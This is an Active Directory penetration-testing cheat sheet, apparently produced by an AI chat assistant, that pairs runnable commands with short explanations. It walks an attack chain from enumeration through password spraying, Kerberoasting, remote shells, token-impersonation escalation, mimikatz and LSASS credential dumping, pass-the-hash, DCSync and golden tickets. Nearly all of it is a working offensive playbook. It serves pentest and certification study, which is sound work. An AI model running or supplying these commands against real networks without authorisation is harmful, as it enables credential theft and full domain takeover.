
-
---

# 🧰 ACTIVE DIRECTORY PENTESTING — COMMANDS + EXPLANATION

---

# 🔍 1. RECON / ENUMERATION (NO CREDS)

---

## 🛰️ Nmap

```bash
nmap -sC -sV -p- -T4 <IP>
```

- 🎯 Purpose: Full service + version discovery
    
- 🧠 Does:
    
    - Scans all 65535 ports
        
    - Runs default scripts (`-sC`)
        
    - Identifies service versions (`-sV`)
        
- 📌 Look for:
    
    - `88` → Kerberos
        
    - `389` → LDAP
        
    - `445` → SMB  
        → Confirms AD environment
        

---

```bash
nmap -p 88,135,139,389,445,464,636,3268,5985 -sC -sV <IP>
```

- 🎯 Purpose: Targeted AD scan
    
- 🧠 Does: Focuses on common AD ports
    
- 📌 Look for:
    
    - WinRM (5985)
        
    - Global Catalog (3268)
        

---

## 📂 SMB Enumeration

---

```bash
crackmapexec smb <IP>
```

- 🎯 Purpose: Quick SMB check
    
- 🧠 Does:
    
    - Tests SMB connectivity
        
    - Identifies OS, domain name, signing status
        
- 📌 Look for:
    
    - `Signing: False` → relay possible
        
    - Domain name
        

---

```bash
crackmapexec smb <IP> --shares
```

- 🎯 Purpose: List shares
    
- 🧠 Does: Enumerates accessible SMB shares
    
- 📌 Look for:
    
    - `READ` or `WRITE` access
        

---

```bash
crackmapexec smb <IP> --users
```

- 🎯 Purpose: Enumerate domain users
    
- 🧠 Does: Pulls user list via SMB/RPC
    
- 📌 Look for:
    
    - Valid usernames for spraying
        

---

```bash
enum4linux -a <IP>
```

- 🎯 Purpose: Full anonymous enumeration
    
- 🧠 Does:
    
    - Queries SMB, RPC, NetBIOS
        
- 📌 Look for:
    
    - Users
        
    - Groups
        
    - Password policy
        

---

```bash
smbclient -L //<IP> -N
```

- 🎯 Purpose: List shares without auth
    
- 🧠 Does: Anonymous SMB connection
    
- 📌 Look for:
    
    - Misconfigured public shares
        

---

```bash
smbclient //<IP>/<SHARE> -N
```

- 🎯 Purpose: Access share
    
- 🧠 Does: Mounts share interactively
    
- 📌 Look for:
    
    - Config files
        
    - Credentials
        

---

## 📡 LDAP Enumeration

---

```bash
ldapsearch -x -H ldap://<IP> -s base
```

- 🎯 Purpose: Basic LDAP info
    
- 🧠 Does: Anonymous LDAP query
    
- 📌 Look for:
    
    - Domain naming context
        

---

```bash
ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local"
```

- 🎯 Purpose: Dump directory
    
- 🧠 Does: Queries AD objects
    
- 📌 Look for:
    
    - Users
        
    - Groups
        
    - Attributes
        

---

## 👤 Kerberos User Enumeration

---

```bash
kerbrute userenum -d domain.local --dc <IP> users.txt
```

- 🎯 Purpose: Validate usernames
    
- 🧠 Does:
    
    - Sends Kerberos requests
        
    - Detects valid users via response timing
        
- 📌 Look for:
    
    - Valid usernames (no lockout)
        

---

# 🔐 2. CREDENTIAL ACCESS

---

## 🔥 AS-REP Roasting

```bash
GetNPUsers.py domain.local/ -no-pass -usersfile users.txt
```

- 🎯 Purpose: Get hashes without creds
    
- 🧠 Does:
    
    - Requests Kerberos ticket for users without pre-auth
        
- 📌 Look for:
    
    - `$krb5asrep$` hash → crackable
        

---

## 🔥 Kerberoasting

```bash
GetUserSPNs.py domain.local/user:password -dc-ip <IP>
```

- 🎯 Purpose: Extract service account hashes
    
- 🧠 Does:
    
    - Requests service tickets (TGS)
        
- 📌 Look for:
    
    - `$krb5tgs$` hashes
        

---

## 🔥 Password Spray

```bash
crackmapexec smb <IP> -u users.txt -p 'Password123'
```

- 🎯 Purpose: Test weak passwords
    
- 🧠 Does:
    
    - Attempts login across many users
        
- 📌 Look for:
    
    - `SUCCESS`
        

---

## 🔥 SMB Bruteforce

```bash
hydra -L users.txt -P passwords.txt smb://<IP>
```

- 🎯 Purpose: Bruteforce SMB
    
- 🧠 Does: Tries all combos
    
- 📌 Look for:
    
    - Valid credentials
        

---

# 💻 3. FOOTHOLD

---

```bash
psexec.py domain/user:password@<IP>
```

- 🎯 Purpose: Remote command execution
    
- 🧠 Does:
    
    - Creates service → runs command as SYSTEM
        
- 📌 Look for:
    
    - SYSTEM shell
        

---

```bash
wmiexec.py domain/user:password@<IP>
```

- 🎯 Purpose: Remote execution (stealthier)
    
- 🧠 Does:
    
    - Uses WMI to execute commands
        
- 📌 Look for:
    
    - Command output
        

---

```bash
evil-winrm -i <IP> -u user -p password
```

- 🎯 Purpose: PowerShell shell
    
- 🧠 Does:
    
    - Authenticates via WinRM
        
- 📌 Look for:
    
    - Interactive shell
        

---

```bash
xfreerdp /u:user /p:password /v:<IP>
```

- 🎯 Purpose: GUI access
    
- 🧠 Does:
    
    - Remote desktop session
        
- 📌 Look for:
    
    - Desktop access
        

---

# 🧠 4. INTERNAL ENUMERATION

---

```bash
winPEAS.exe
```

- 🎯 Purpose: Local privilege escalation scan
    
- 🧠 Does:
    
    - Checks services, registry, permissions
        
- 📌 Look for:
    
    - Red/yellow highlights
        

---

```bash
Seatbelt.exe all
```

- 🎯 Purpose: System enumeration
    
- 🧠 Does:
    
    - Collects system artifacts
        
- 📌 Look for:
    
    - Credentials, configs
        

---

```bash
SharpHound.exe -c All
```

- 🎯 Purpose: Collect AD graph data
    
- 🧠 Does:
    
    - Maps relationships (users, groups, ACLs)
        
- 📌 Look for:
    
    - Import into BloodHound
        

---

```bash
whoami /priv
```

- 🎯 Purpose: Check privileges
    
- 🧠 Does: Lists token privileges
    
- 📌 Look for:
    
    - `SeImpersonatePrivilege`
        

---

```bash
cmdkey /list
```

- 🎯 Purpose: Stored credentials
    
- 🧠 Does:
    
    - Lists saved login sessions
        
- 📌 Look for:
    
    - Reusable creds
        

---

# 🔺 5. PRIVILEGE ESCALATION

---

```bash
JuicyPotato.exe -l 1337 -p cmd.exe -t *
```

- 🎯 Purpose: SYSTEM via token impersonation
    
- 🧠 Does:
    
    - Exploits COM privilege escalation
        
- 📌 Look for:
    
    - SYSTEM shell
        

---

```bash
PrintSpoofer.exe -i -c cmd
```

- 🎯 Purpose: SYSTEM shell
    
- 🧠 Does:
    
    - Exploits print spooler
        
- 📌 Look for:
    
    - Elevated shell
        

---

```bash
sc qc <service>
```

- 🎯 Purpose: Inspect service
    
- 🧠 Does:
    
    - Shows binary path
        
- 📌 Look for:
    
    - Writable path
        

---

# 🧪 6. CREDENTIAL DUMPING

---

```bash
mimikatz.exe
sekurlsa::logonpasswords
```

- 🎯 Purpose: Dump creds
    
- 🧠 Does:
    
    - Reads LSASS memory
        
- 📌 Look for:
    
    - Plaintext / NTLM hashes
        

---

```bash
procdump.exe -ma lsass.exe lsass.dmp
```

- 🎯 Purpose: Dump LSASS
    
- 🧠 Does:
    
    - Saves memory to file
        
- 📌 Look for:
    
    - Offline extraction
        

---

# 🔁 7. LATERAL MOVEMENT

---

```bash
crackmapexec smb <targets.txt> -u user -p password
```

- 🎯 Purpose: Reuse creds
    
- 🧠 Does:
    
    - Tests login across machines
        
- 📌 Look for:
    
    - Admin access
        

---

```bash
psexec.py -hashes <LM:NT> user@<IP>
```

- 🎯 Purpose: Pass-the-Hash
    
- 🧠 Does:
    
    - Auth without password
        
- 📌 Look for:
    
    - Shell access
        

---

# 👑 8. DOMAIN DOMINATION

---

```bash
lsadump::dcsync /user:krbtgt
```

- 🎯 Purpose: Dump domain hashes
    
- 🧠 Does:
    
    - Mimics domain controller replication
        
- 📌 Look for:
    
    - KRBTGT hash
        

---

```bash
kerberos::golden ...
```

- 🎯 Purpose: Persistent access
    
- 🧠 Does:
    
    - Forges Kerberos tickets
        
- 📌 Look for:
    
    - Unlimited access
        

---

# 🧬 9. ADVANCED ATTACKS

---

```bash
certipy find -u user@domain -p password
```

- 🎯 Purpose: Find ADCS misconfigs
    
- 🧠 Does:
    
    - Enumerates certificate templates
        
- 📌 Look for:
    
    - ESC1, ESC2
        

---

```bash
certipy req -u user@domain -p password -template <template>
```

- 🎯 Purpose: Request certificate
    
- 🧠 Does:
    
    - Issues cert for auth
        
- 📌 Look for:
    
    - Privilege escalation
        

---

```bash
impacket-rbcd -action write ...
```

- 🎯 Purpose: RBCD attack
    
- 🧠 Does:
    
    - Sets delegation rights
        
- 📌 Look for:
    
    - Impersonation ability
        

---

# ⚡ FINAL MENTAL MODEL

Every command fits this:

```
ENUM → FIND WEAKNESS → GET CREDS → EXECUTE → ESCALATE → MOVE → REPEAT
```

---

If you want next upgrade:

- 🧾 I’ll convert this into a **perfect Obsidian vault structure (folders + tags + links)**
    
- 🧠 Or a **decision-based “IF THIS → RUN THIS” cheat sheet**
    
- 🎯 Or **exam-ready attack chains (CRTP / OSCP level)**
    

Just say:  
👉 **“vault”** or **“decision sheet”** or **“exam chains”**